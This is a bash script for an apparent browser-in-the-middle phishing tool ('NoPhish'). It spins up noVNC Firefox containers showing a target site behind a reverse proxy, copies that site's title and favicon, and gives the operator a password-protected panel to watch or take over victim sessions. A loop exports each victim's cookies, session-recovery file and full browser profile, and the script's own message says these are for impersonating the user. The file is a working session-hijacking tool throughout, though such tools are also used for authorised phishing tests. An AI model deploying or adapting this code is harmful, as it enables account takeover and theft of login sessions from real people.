#!/bin/bash

	helpFunction()
	{
	   echo ""
	   echo "Usage: $0 -u No. Users -d Domain -t Target"
	   echo -e "\t -u Number of users - please note for every user a container is spawned so don't go crazy"
	   echo -e "\t -d Domain which is used for phishing"
	   echo -e "\t -t Target website which should be displayed for the user"
	   echo -e "\t -e Export format"
	   echo -e "\t -s true / false if ssl is required - if ssl is set pem and key file are needed"
	   echo -e "\t -c Full path to the pem file of the ssl certificate"
	   echo -e "\t -k Full path to the key file of the ssl certificate"
	   echo -e "\t -a Adjust default user agent string"  
	   echo -e "\t -z Compress profile to zip - will be ignored if parameter -e is set"
	   exit 1 # Exit script after printing help
	}
	
	while getopts "u:d:t:s:c:k:e:a:z:" opt
	do
		case "$opt" in
		u ) User="$OPTARG" ;;
		d ) Domain="$OPTARG" ;;
		t ) Target="$OPTARG" ;;
		e ) OFormat="$OPTARG" ;;
		s ) SSL="$OPTARG" ;;
		c ) cert="$OPTARG" ;;
		k ) key="$OPTARG" ;;
		a ) useragent=$OPTARG ;;
		z ) rzip=$OPTARG ;;
		? ) helpFunction ;; # Print helpFunction in case parameter is non-existent
		esac
	done



# Begin script in case all parameters are correct

# Loop for every user a docker container need to be started 
 
# Write of default config for apache

case "$1" in 

"install")
	sudo docker build -t vnc-docker -f ./VNC-Dockerfile ./
	sudo docker build -t rev-proxy -f ./PROXY-Dockerfile ./
	;;
"cleanup")
	sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q)
	sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q)
	while true; do
	    read -p "Do you want to perform a full cleanup? " yn
	    case $yn in
	    [Yy]* ) 
			sudo docker rmi -f $(sudo docker images --filter=reference="vnc-docker" -q)
			sudo docker rmi -f $(sudo docker images --filter=reference="rev-proxy" -q)
			exit;;
	    [Nn]* ) exit;;
	    * ) echo "Please answer yes or no.";;
	esac
	done
	;;
*)
	
	# Print helpFunction in case parameters are empty
	if [ -z "$User" ] || [ -z "$Domain" ] || [ -z "$Target" ]
	then
		echo "Some or all of the parameters are empty";
		helpFunction
	fi
	
	if [ -z "$rzip" ]
	then
		rzip=true
	fi
	
	if [ -n "$SSL" ]
	then
		if [ -z "$cert" ] || [ -z "$key" ]
		then
		echo "Some or all of the parameters are empty";
		helpFunction
		elif [ ! -f "$cert" ] || [ ! -f "$key" ]
		then 
		echo "Certificate and / or Key file could not be found."
		exit 1
		fi
	fi

	START=1
	END=$User
	
	temptitle=$(curl $Target -sL | grep -oP '(?<=title).*(?<=title>)' | grep -oP '(?=>).*(?=<)') 
	pagetitle="${temptitle:1}"
	
	curl https://www.google.com/s2/favicons?domain=$Target -sL --output novnc.ico
	icopath="./novnc.ico"
	
	printf "[-] Configuration file generating\033[0K\r" 
	echo 'NameVirtualHost *
             Header unset ETag
             Header set Cache-Control "max-age=0, no-cache, no-store, must-revalidate"
             Header set Pragma "no-cache"
             Header set Expires "Wed, 12 Jan 1980 05:00:00 GMT"
	     ' > ./proxy/000-default.conf
	
	if [ -n "$SSL" ]
	then
		echo "<VirtualHost *:443>" >> ./proxy/000-default.conf
		echo "
		SSLEngine on
	   	SSLCertificateFile /etc/ssl/certs/server.pem
	   	SSLCertificateKeyFile /etc/ssl/private/server.key
		" >> ./proxy/000-default.conf
		echo '
		RewriteEngine On
    		RewriteMap redirects txt:/tmp/redirects.txt
    		RewriteCond ${redirects:%{HTTP_HOST}%{REQUEST_URI}} ^.+
    		RewriteRule ^ ${C:1}? [R=302,L]
    		
    		<Location /status.php>
		    Deny from all
		</Location>
		' >> ./proxy/000-default.conf
	else
		echo "<VirtualHost *:80>" >> ./proxy/000-default.conf
		echo '
		RewriteEngine On
    		RewriteMap redirects txt:/tmp/redirects.txt
    		RewriteCond ${redirects:%{HTTP_HOST}%{REQUEST_URI}} ^.+
    		RewriteRule ^ ${C:1}? [R=302,L]
		
		<Location /status.php>
		    Deny from all
		</Location>
		' >> ./proxy/000-default.conf
	fi
	 
        printf "[+] Configuration file generated \n" 
        
        htmlpath="./output/status.php"
        if [ -e $htmlpath ]
        then
        	rm -rf $htmlpath
        fi
        
        echo '
<!DOCTYPE html>
<html>
<head>
<title>NoPhis status</title>
<style>
body {
    background-color: rgb(9, 25, 75);
    margin: 0;
    padding: 0;
}

.container {
    background-color: rgb(56, 74, 99);
    width: 180vh;
    height: 80vh;
    border-radius: 10px;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 20px auto;
    position: relative;
}

#scaled-iframe {
    min-width: 1600px;
    min-height: 900px;
    -ms-zoom: 0.5;
    -moz-transform: scale(0.5);
    -moz-transform-origin: middle;
    -o-transform: scale(0.5);
    -o-transform-origin: middle;
    -webkit-transform: scale(0.5);
    -webkit-transform-origin: middle;
}

.buttons-container {
    display: flex;
    flex-direction: column;
    align-items: flex-start; /* Align buttons to the left within the container */
    justify-content: space-between; /* Add equal space between buttons */
    background-color: rgb(56, 74, 99);
    border-radius: 10px;
    padding: 10px;
    margin-right: 400px; /* Add spacing between bigger container and buttons container */
}

.orange-button {
    background-color: orange;
    color: white;
    border: none;
    border-radius: 5px;
    padding: 10px 30px;
    font-size: 16px;
    cursor: pointer;
    text-decoration: none;
    white-space: nowrap;
    margin-bottom: 10px; /* Add bottom margin for spacing between buttons */
}
</style>
</head>

  <?php
    if (isset($_POST["create_file"])) {
        // Get the value of the file content from the form input
        $file_content = $_POST["file_content"];
        $file_content2 = $_POST["file_content2"];
	$ip = $_POST["ip_value"];
        // Specify the file path and name
        $file_path = "/tmp/redirects.txt";
        $ip_path = "/tmp/disconnect.txt";

        if (file_exists($ip_path)) {
            // Read the existing content of the file
            $ipfile_content = file_get_contents($ip_path);

            // Check if the new content is already in the file
            if (strpos($ipfile_content, $ip) !== false) {
                // echo "<p>Error: Duplicate content. The content already exists in the file.</p>";
            } else {
                // If the new content is not a duplicate, open the file in append mode to add content at the end
                $ipfile_handle = fopen($ip_path, "a") or die("Unable to open file for appending!");

                // Write the content to the file
                fwrite($ipfile_handle, $ip . PHP_EOL);

                // Close the file handle
                fclose($ipfile_handle);

                // echo "<p>File operation completed successfully!</p>";
            }
        } else {
            // If the file does not exist, create a new file
            $ipfile_handle = fopen($ip_path, "w") or die("Unable to create file!");
	    
            // Write the content to the file
            fwrite($ipfile_handle, $ip . PHP_EOL);

            // Close the file handle
            fclose($ipfile_handle);

            // echo "<p>File created successfully!</p>";
        }




        // Check if the file exists
        if (file_exists($file_path)) {
            // Read the existing content of the file
            $existing_content = file_get_contents($file_path);

            // Check if the new content is already in the file
            if (strpos($existing_content, $file_content) !== false) {
                // echo "<p>Error: Duplicate content. The content already exists in the file.</p>";
            } else {
                // If the new content is not a duplicate, open the file in append mode to add content at the end
                $file_handle = fopen($file_path, "a") or die("Unable to open file for appending!");

                // Write the content to the file
                fwrite($file_handle, $file_content . PHP_EOL);

                // Close the file handle
                fclose($file_handle);

                // echo "<p>File operation completed successfully!</p>";
            }
            
            // Check if the new content is already in the file
            if (strpos($existing_content, $file_content2) !== false) {
                // echo "<p>Error: Duplicate content. The content already exists in the file.</p>";
            } else {
                // If the new content is not a duplicate, open the file in append mode to add content at the end
                $file_handle = fopen($file_path, "a") or die("Unable to open file for appending!");

                // Write the content to the file
                fwrite($file_handle, $file_content2 . PHP_EOL);

                // Close the file handle
                fclose($file_handle);

                // echo "<p>File operation completed successfully!</p>";
            }
        } else {
            // If the file does not exist, create a new file
            $file_handle = fopen($file_path, "w") or die("Unable to create file!");
	    
            // Write the content to the file
            fwrite($file_handle, $file_content . PHP_EOL);
	    fwrite($file_handle, $file_content2 . PHP_EOL);
            // Close the file handle
            fclose($file_handle);

            // echo "<p>File created successfully!</p>";
        }
    }
    ?>

 
	' > ./output/status.php
        
	declare -a urls=()
	printf "[-] Starting containers \033[0K\r\n"  
	for (( c=$START; c<=$END; c++ ))
	do
	    PW=$(openssl rand -hex 14)
	    AdminPW=$(tr -dc 'A-Za-z0-9!' < /dev/urandom | head -c 32)
	    sudo docker run -dit --name vnc-user$c -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 vnc-docker &> /dev/null
	    sleep 1
	    sudo docker exec vnc-user$c sh -c "firefox &" &> /dev/null
	    sleep 1
	    sudo docker exec vnc-user$c sh -c "pidof firefox | xargs kill &" &> /dev/null
	    if [ -n "$useragent" ]
	    then
	    	echo 'user_pref("general.useragent.override","'$useragent'");' > ./vnc/user.js
	    	echo 'user_pref("font.name.serif.x-western", "DejaVu Sans");' >> ./vnc/user.js
	    	echo 'user_pref("signon.autofillForms", "false");' >> ./vnc/user.js
	    	sudo docker cp ./vnc/user.js vnc-user$c:/home/headless/
	    	sudo docker exec vnc-user$c /bin/bash -c 'find -name prefs.js -exec dirname {} \; | xargs cp /home/headless/user.js '
	    else
	    	echo 'user_pref("general.useragent.override","This user was phished by NoPhish");' > ./vnc/user.js
	    	echo 'user_pref("font.name.serif.x-western", "DejaVu Sans");' >> ./vnc/user.js
	    	echo 'user_pref("signon.autofillForms", "false");' >> ./vnc/user.js
	    	sudo docker cp ./vnc/user.js vnc-user$c:/home/headless/user.js
	    	sudo docker exec vnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -n 1 cp -f -r /home/headless/user.js "	    	  
	    fi
	    
	    sleep 1
	    
	    if [ -n "$pagetitle" ]
	    then
	        sudo docker exec --user root vnc-user$c sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/conn.html"
	        sudo docker exec --user root vnc-user$c sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/app/ui.js"
	    fi
	    
	    if [ -e $icopath ]
	    then
	    	sudo docker cp ./novnc.ico vnc-user$c:/usr/libexec/noVNCdim/app/images/icons/novnc.ico
	    	
	    fi
	    
	    
	    
	    
	    sudo docker exec vnc-user$c sh -c "xfconf-query --channel xsettings --property /Gtk/CursorThemeName --set WinCursor &" 
	    sudo docker exec vnc-user$c sh -c "xrandr --output VNC-0 & env DISPLAY=:1 firefox $Target --kiosk &" &> /dev/null
	    
	    CIP=$(sudo sudo docker container inspect vnc-user$c | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
	    

	    echo "
		<Location /$PW>
		ProxyPass http://$CIP:6901
		ProxyPassReverse http://$CIP:6901
		</Location>
		<Location /$PW/websockify>
		ProxyPass ws://$CIP:6901/websockify keepalive=On
		ProxyPassReverse ws://$CIP:6901/websockify
		</Location>
		ProxyTimeout 600
		Timeout 600
	" >> ./proxy/000-default.conf
	    printf "[-] Starting containers $c of $END\033[0K\r"

	    
	if [ -n "$SSL" ]
	then
		echo "
                  <div class='container'>
			<iframe id='scaled-iframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
			<form action='' method='post'>
			<div class='buttons-container'>
			    <a href='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' class='orange-button'>View user Session  $c</a>
                            <input type='hidden' name='file_content' value='$Domain/$PW/websockify $Domain'>
                            <input type='hidden' name='file_content2' value='$Domain/$PW/conn.html $Domain'>
                            <input type='hidden' name='ip_value' value='$CIP'>
			    <button type='submit' name='create_file' class='orange-button'>Disconnect User Session</button>
			    <a href='https://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' class='orange-button'>Connect to Session $c</a>
			</div>
			</form>
		    </div>
		" >> ./output/status.php
		urls+=("https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote")
	else
		echo "
                  <div class='container'>
			<iframe id='scaled-iframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
			<form action='' method='post'>
			<div class='buttons-container'>
			    <a href='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' class='orange-button'>View user Session  $c</a>
                            <input type='hidden' name='file_content' value='$Domain/$PW/websockify $Domain'>
                            <input type='hidden' name='file_content2' value='$Domain/$PW/conn.html $Domain'>
                            <input type='hidden' name='ip_value' value='$CIP'>
			    <button type='submit' name='create_file' class='orange-button'>Disconnect User Session</button>
			    <a href='http://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' class='orange-button'>Connect to Session $c</a>
			</div>
			</form>
		    </div>
		" >> ./output/status.php
		urls+=("http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote")
	fi
	done
	echo "
	</body>
	</html>
        " >> ./output/status.php
	echo "</VirtualHost>" >> ./proxy/000-default.conf
        rm -r ./novnc.ico
        
        if [ -n "$SSL" ]
	then
		apachefile="./proxy/000-default.conf"
        	awk '/<VirtualHost/,/<\/VirtualHost/ {gsub(":443", ":65534");gsub("Location /","Location /angler/");print; if (/<\/VirtualHost/) print ""}' "$apachefile" > temp.txt
		awk '/<VirtualHost/,/<\/VirtualHost/ {gsub("Location /angler/status.php","Location /");gsub("Deny from all","AuthType Basic \n                    AuthName \"Restricted Area\" \n                    AuthUserFile /etc/apache2/.htpasswd \n                    Require valid-user");print; if (/<\/VirtualHost/) print ""}' "temp.txt" > temp2.txt
	else
		apachefile="./proxy/000-default.conf"
        	awk '/<VirtualHost/,/<\/VirtualHost/ {gsub(":80", ":65534");gsub("Location /","Location /angler/");print; if (/<\/VirtualHost/) print ""}' "$apachefile" > temp.txt
		awk '/<VirtualHost/,/<\/VirtualHost/ {gsub("Location /angler/status.php","Location /");gsub("Deny from all","AuthType Basic \n                    AuthName \"Restricted Area\" \n                    AuthUserFile /etc/apache2/.htpasswd \n                    Require valid-user");print; if (/<\/VirtualHost/) print ""}' "temp.txt" > temp2.txt
	fi
        

	cat temp2.txt >> ./proxy/000-default.conf
	
	rm -r ./temp.txt
	rm -r ./temp2.txt

        printf "[+] VNC Containers started                          \n"  
        printf "[-] Starting reverse proxy \033[0K\r\n"  
	# start of rev proxy
	if [ -n "$SSL" ]
	then
		sudo docker run -dit -p443:443 -p65534:65534 --name rev-proxy rev-proxy /bin/bash     &> /dev/null
	else
		sudo docker run -dit -p80:80 -p65534:65534 --name rev-proxy rev-proxy /bin/bash       &> /dev/null
	fi
	
	sleep 5

	if [ -n "$SSL" ]
	then
		sudo docker cp $cert rev-proxy:/etc/ssl/certs/server.pem
		sudo docker cp $key rev-proxy:/etc/ssl/private/server.key
	fi
	
	sudo docker exec rev-proxy /bin/bash -c 'echo "Listen 65534" >> /etc/apache2/ports.conf' 
	sudo docker exec -it rev-proxy /bin/bash -c "htpasswd -cb /etc/apache2/.htpasswd angler $AdminPW"
	sudo docker cp ./proxy/000-default.conf rev-proxy:/etc/apache2/sites-enabled/   &> /dev/null
	sudo docker exec rev-proxy sed -i 's/MaxKeepAliveRequests 100/MaxKeepAliveRequests 0/' '/etc/apache2/apache2.conf'
	
	sudo docker exec rev-proxy /bin/bash service apache2 restart &> /dev/null
        sudo docker exec rev-proxy /bin/bash -c "cron"
        sleep 3
        sudo docker exec rev-proxy /bin/bash -c "crontab"
        sudo docker cp ./output/status.php rev-proxy:/var/www/html/
        printf "[+] Reverse proxy running \033[0K\r\n"  
        	if [ -n "$SSL" ]
	then
		printf "[+] Admin interface available under https://$Domain:65534/status.php            \n"
	else
		printf "[+] Admin interface available under http://$Domain:65534/status.php            \n"
	fi
        
        printf "    Login with: \n"
        printf "    Username: angler \n"
        printf "    Password: $AdminPW  \n"  
	printf "[+] Setup completed \n"
	printf "[+] Use the following URLs:\n"   
	for value in "${urls[@]}"
	do
		echo $value
	done
	
	dbpath="./output/phis.db"

        if [ -e $dbpath ]
        then
        	rm -rf $dbpath
        fi
	
	printf "[-] Starting Loop to collect sessions and cookies from containers\n" 
	printf "[+] You can check and view the open session by use of the status.php in the output directory\n" 
	#Start a loop which copies the cookies from the containers
	printf "    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..\n"
	trap 'printf "\n[-] Import stealed session and cookie JSON or the firefox profile to impersonate user\n"; printf "[-] VNC and Rev-Proxy container will be removed\n" ; sleep 2 ; sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q) &> /dev/null && sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q) &> /dev/null & printf "[+] Done!"; sleep 2' SIGTERM EXIT
	sleep 60
	while :
	do
	for (( c=$START; c<=$END; c++ ))
	do
           pushd ./output &> /dev/null
           sudo docker exec vnc-user$c sh -c "find -name recovery.jsonlz4 -exec cp {} /home/headless/ \;"
           sudo docker exec vnc-user$c sh -c "find -name cookies.sqlite -exec cp {} /home/headless/ \;"
           sleep 2
           sudo docker cp vnc-user$c:/home/headless/recovery.jsonlz4 ./user$c-recovery.jsonlz4
           sudo docker cp vnc-user$c:/home/headless/cookies.sqlite ./user$c-cookies.sqlite
           sudo docker exec vnc-user$c sh -c "rm -f /home/headless/recovery.jsonlz4"
           sudo docker exec vnc-user$c sh -c "rm -f /home/headless/cookies.sqlite"
           sleep 2
           if [ -n "$OFormat" ]
	   then
		python3 ./session-collector.py ./user$c-recovery.jsonlz4 simple
		python3 ./cookies-collector.py ./user$c-cookies.sqlite simple
	   else
		sudo docker exec vnc-user$c sh -c 'cp -rf .mozilla/firefox/$(find -name recovery.jsonlz4 | cut -d "/" -f 4)/ ffprofile'
		sudo docker cp vnc-user$c:/home/headless/ffprofile ./phis$c-ffprofile
		sudo docker exec vnc-user$c sh -c "rm -rf /home/headless/ffprofile"
		sudo chown -R 1000 ./phis$c-ffprofile
		
		if [ "$rzip" = true ] 
		then
		   zip -r phis$c-ffprofile.zip phis$c-ffprofile/ &> /dev/null
		   rm -r phis$c-ffprofile/
		fi
		python3 ./session-collector.py ./user$c-recovery.jsonlz4 default
		python3 ./cookies-collector.py ./user$c-cookies.sqlite default
	   
	   fi

	   
           rm -r -f ./user$c-recovery.jsonlz4 
           rm -r -f ./user$c-cookies.sqlite
           rm -r -f ./user$c-cookies.sqlite*
           python3 ./status.py $c "${urls[$(($c - 1))]}"
	   
	   popd &> /dev/null
	done

	sleep 60
	echo -e "\033[$((($c * 3) - 2))A"
	done

	;;
esac
